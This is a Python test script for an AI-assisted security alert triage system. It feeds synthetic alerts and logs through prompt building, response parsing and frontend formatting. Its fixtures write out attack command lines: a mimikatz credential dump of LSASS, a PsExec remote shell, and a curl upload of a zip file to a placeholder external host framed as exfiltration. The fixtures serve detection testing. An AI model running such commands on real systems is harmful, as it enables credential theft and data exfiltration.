"""
Test Script for Hypothesis Analysis
=====================================

Tests the hypothesis testing prompt system with various alert types.
Run this to see how the improved analysis works.

Usage:
    python scripts/test_hypothesis_analysis.py
"""

import os
import sys
import json

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.ai.hypothesis_analysis import (
    build_hypothesis_prompt,
    parse_hypothesis_response,
    format_for_frontend
)


# Test alerts covering different scenarios
TEST_ALERTS = [
    {
        "name": "OBVIOUS_MALICIOUS",
        "alert": {
            "alert_id": "TEST-001",
            "alert_name": "Mimikatz Credential Dumping",
            "mitre_technique": "T1003.001",
            "severity": "critical",
            "description": "Known credential theft tool detected accessing LSASS memory",
            "source_ip": "10.0.0.50",
            "dest_ip": "45.33.32.156"
        },
        "logs": {
            "process": [
                {
                    "process_name": "mimikatz.exe",
                    "command_line": "mimikatz.exe \"sekurlsa::logonpasswords\"",
                    "user": "jsmith",
                    "parent_process": "cmd.exe",
                    "file_path": "C:\\Temp\\mimikatz.exe",
                    "timestamp": "2024-01-15T02:47:00Z"
                },
                {
                    "process_name": "lsass.exe",
                    "command_line": "Memory read by PID 4532",
                    "user": "SYSTEM",
                    "parent_process": "wininit.exe",
                    "file_path": "C:\\Windows\\System32\\lsass.exe",
                    "timestamp": "2024-01-15T02:47:05Z"
                }
            ],
            "network": [
                {
                    "source_ip": "10.0.0.50",
                    "dest_ip": "45.33.32.156",
                    "dest_port": 443,
                    "protocol": "TCP",
                    "bytes": 8192,
                    "timestamp": "2024-01-15T02:47:30Z"
                }
            ]
        },
        "expected_verdict": "malicious",
        "description": "Clear-cut credential theft with C2 connection"
    },
    {
        "name": "OBVIOUS_BENIGN",
        "alert": {
            "alert_id": "TEST-002",
            "alert_name": "PowerShell Encoded Command",
            "mitre_technique": "T1059.001",
            "severity": "medium",
            "description": "Encoded PowerShell command detected",
            "source_ip": "10.0.0.100",
            "dest_ip": "N/A"
        },
        "logs": {
            "process": [
                {
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe -EncodedCommand R2V0LVdtaU9iamVjdA==",  # Get-WmiObject
                    "user": "itadmin",
                    "parent_process": "sccm-agent.exe",
                    "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "timestamp": "2024-01-15T10:30:00Z"
                }
            ],
            "network": []
        },
        "expected_verdict": "benign",
        "description": "IT admin running SCCM script during business hours"
    },
    {
        "name": "TRICKY_LATERAL_MOVEMENT",
        "alert": {
            "alert_id": "TEST-003",
            "alert_name": "PsExec Remote Execution",
            "mitre_technique": "T1570",
            "severity": "high",
            "description": "PsExec used to execute commands on remote system",
            "source_ip": "10.0.0.25",
            "dest_ip": "10.0.0.30"
        },
        "logs": {
            "process": [
                {
                    "process_name": "psexec.exe",
                    "command_line": "psexec.exe \\\\10.0.0.30 -u admin -p [REDACTED] cmd.exe",
                    "user": "svc_deploy",
                    "parent_process": "jenkins.exe",
                    "file_path": "C:\\Tools\\SysInternals\\psexec.exe",
                    "timestamp": "2024-01-15T03:00:00Z"
                }
            ],
            "network": [
                {
                    "source_ip": "10.0.0.25",
                    "dest_ip": "10.0.0.30",
                    "dest_port": 445,
                    "protocol": "SMB",
                    "bytes": 2048,
                    "timestamp": "2024-01-15T03:00:05Z"
                }
            ],
            "windows_event": [
                {
                    "event_id": 4624,
                    "message": "Logon Type 3 (Network) from 10.0.0.25",
                    "user": "svc_deploy",
                    "timestamp": "2024-01-15T03:00:06Z"
                }
            ]
        },
        "expected_verdict": "suspicious",
        "description": "Could be CI/CD deployment OR lateral movement. Time (3AM) is concerning."
    },
    {
        "name": "SUBTLE_DATA_EXFIL",
        "alert": {
            "alert_id": "TEST-004",
            "alert_name": "Large Outbound Transfer",
            "mitre_technique": "T1041",
            "severity": "medium",
            "description": "Unusually large data transfer to external IP",
            "source_ip": "10.0.0.75",
            "dest_ip": "185.220.101.45"
        },
        "logs": {
            "process": [
                {
                    "process_name": "curl.exe",
                    "command_line": "curl.exe -X POST -d @data.zip https://transfer.example.com/upload",
                    "user": "marketing_user",
                    "parent_process": "explorer.exe",
                    "file_path": "C:\\Windows\\System32\\curl.exe",
                    "timestamp": "2024-01-15T16:45:00Z"
                }
            ],
            "network": [
                {
                    "source_ip": "10.0.0.75",
                    "dest_ip": "185.220.101.45",
                    "dest_port": 443,
                    "protocol": "HTTPS",
                    "bytes": 52428800,
                    "timestamp": "2024-01-15T16:45:30Z"
                }
            ],
            "file": [
                {
                    "file_path": "C:\\Users\\marketing_user\\Documents\\data.zip",
                    "action": "read",
                    "hash": "abc123...",
                    "timestamp": "2024-01-15T16:44:50Z"
                }
            ]
        },
        "expected_verdict": "suspicious",
        "description": "50MB upload to file sharing site. Could be legitimate or exfil."
    }
]


def print_separator(title: str):
    print("\n" + "="*70)
    print(f"  {title}")
    print("="*70)


def test_prompt_generation():
    """Test that prompts are generated correctly"""
    print_separator("TEST: Prompt Generation")
    
    for test in TEST_ALERTS[:1]:  # Just first one for brevity
        prompt = build_hypothesis_prompt(
            test['alert'],
            test['logs'],
            rag_context="Test RAG context about the attack technique."
        )
        
        print(f"\n[Alert: {test['name']}]")
        print(f"Generated prompt length: {len(prompt)} chars")
        print("\n--- PROMPT PREVIEW ---")
        print(prompt[:1500])
        print("\n... (truncated)")


def test_response_parsing():
    """Test that responses are parsed correctly"""
    print_separator("TEST: Response Parsing")
    
    # Simulate a good response
    good_response = json.dumps({
        "fact_extraction": [
            {
                "log_ref": "[PROCESS-1]",
                "raw_observation": "mimikatz.exe ran with sekurlsa::logonpasswords",
                "timestamp": "2024-01-15T02:47:00Z"
            }
        ],
        "log_education": [
            {
                "log_ref": "[PROCESS-1]",
                "log_type": "Process Execution",
                "what_this_shows": "A credential dumping tool was executed",
                "normal_behavior": "This tool should NEVER run in production",
                "abnormal_indicators": "Mimikatz is always malicious in enterprise environments",
                "what_to_check": "Check for lateral movement after this event"
            }
        ],
        "hypothesis_benign": {
            "supporting_evidence": ["None - mimikatz has no legitimate use"],
            "strength": "weak",
            "explanation": "There is no legitimate reason for mimikatz to run"
        },
        "hypothesis_malicious": {
            "supporting_evidence": [
                "[PROCESS-1] Known credential theft tool",
                "[NETWORK-1] Connection to external IP after execution",
                "Execution at 2:47 AM outside business hours"
            ],
            "strength": "strong",
            "explanation": "Classic credential theft attack pattern"
        },
        "verdict": "malicious",
        "confidence": 0.95,
        "winning_hypothesis": "Malicious hypothesis wins decisively. Mimikatz is a known attack tool with no legitimate enterprise use, and it connected to an external IP immediately after execution.",
        "evidence_gap": "Would benefit from knowing if the external IP is known C2 infrastructure.",
        "recommendation": "IMMEDIATE: Isolate the host, disable the user account, reset credentials for all accounts that logged into this machine."
    })
    
    result = parse_hypothesis_response(good_response)
    print(f"\n[Good Response Parse]")
    print(f"Success: {result['success']}")
    if result['success']:
        print(f"Verdict: {result['data']['verdict']}")
        print(f"Confidence: {result['data']['confidence']}")
        print(f"Hypothesis comparison:")
        print(f"  Benign strength: {result['data']['hypothesis_benign']['strength']}")
        print(f"  Malicious strength: {result['data']['hypothesis_malicious']['strength']}")
    
    # Test bad response
    bad_response = "This is not JSON at all!"
    result = parse_hypothesis_response(bad_response)
    print(f"\n[Bad Response Parse]")
    print(f"Success: {result['success']}")
    print(f"Error: {result.get('error', 'N/A')}")


def test_frontend_format():
    """Test frontend formatting"""
    print_separator("TEST: Frontend Format")
    
    analysis = {
        "success": True,
        "data": {
            "fact_extraction": [
                {"log_ref": "[PROCESS-1]", "raw_observation": "mimikatz.exe executed"}
            ],
            "log_education": [
                {
                    "log_ref": "[PROCESS-1]",
                    "log_type": "Process",
                    "what_this_shows": "Credential theft tool ran",
                    "normal_behavior": "Should never run",
                    "abnormal_indicators": "All mimikatz executions are abnormal",
                    "what_to_check": "Check for data exfiltration"
                }
            ],
            "hypothesis_benign": {"strength": "weak", "supporting_evidence": []},
            "hypothesis_malicious": {"strength": "strong", "supporting_evidence": ["Tool is known malware"]},
            "verdict": "malicious",
            "confidence": 0.92,
            "winning_hypothesis": "Malicious - clear attack tool",
            "evidence_gap": "None",
            "recommendation": "Isolate immediately"
        }
    }
    
    frontend = format_for_frontend(analysis)
    print("\n[Frontend Format]")
    print(json.dumps(frontend, indent=2))


def show_test_alerts():
    """Display all test alerts"""
    print_separator("AVAILABLE TEST ALERTS")
    
    for i, test in enumerate(TEST_ALERTS, 1):
        print(f"\n{i}. {test['name']}")
        print(f"   Alert: {test['alert']['alert_name']}")
        print(f"   MITRE: {test['alert']['mitre_technique']}")
        print(f"   Expected: {test['expected_verdict'].upper()}")
        print(f"   Why: {test['description']}")


if __name__ == '__main__':
    print("\n" + "#"*70)
    print("#  EDUCATIONAL ANALYSIS TEST SUITE")
    print("#"*70)
    
    # Run tests
    test_prompt_generation()
    test_response_parsing()
    test_frontend_format()
    show_test_alerts()
    
    print("\n" + "="*70)
    print("  TESTS COMPLETE")
    print("="*70)
    print("\nTo test with real Claude API, run the backend and send an alert.")
    print("Hypothesis mode is already integrated into alert_analyzer_final.py.")
